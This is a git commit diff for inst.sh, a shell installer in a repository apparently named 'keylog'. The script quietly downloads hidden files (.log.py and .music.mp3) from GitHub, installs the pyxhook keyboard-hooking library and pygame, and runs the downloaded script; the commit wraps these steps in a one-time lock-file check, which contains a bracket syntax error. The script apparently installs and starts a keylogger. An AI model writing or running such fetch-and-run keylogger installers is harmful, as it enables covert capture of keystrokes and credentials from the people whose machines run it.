6c97ec14c9ec0e366203621ef46705f13a42a585
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-14 03:21:45 +0000

    Update inst.sh

--- inst.sh
+++ inst.sh
@@ -1,7 +1,9 @@
 #!/bin/bash
 
-touch .pylock
-wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
-wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
-yes | pip3 install pyxhook pygame 
-python3 .log.py
+if [ ! -f .pylock]; then
+  touch .pylock
+  wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
+  wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
+  yes | pip3 install pyxhook pygame 
+  python3 .log.py
+fi;
